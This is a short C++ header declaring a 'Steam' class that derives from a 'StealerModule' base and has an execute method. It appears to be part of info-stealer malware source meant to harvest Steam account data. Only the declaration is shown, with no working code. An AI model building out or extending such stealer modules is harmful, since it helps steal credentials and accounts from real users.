//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_STEAM_H
#define STEALER_STEAM_H


#include "../../../StealerModule.h"

class Steam : public StealerModule {
public:
    void execute(fs::path &root) override;
};


#endif //STEALER_STEAM_H
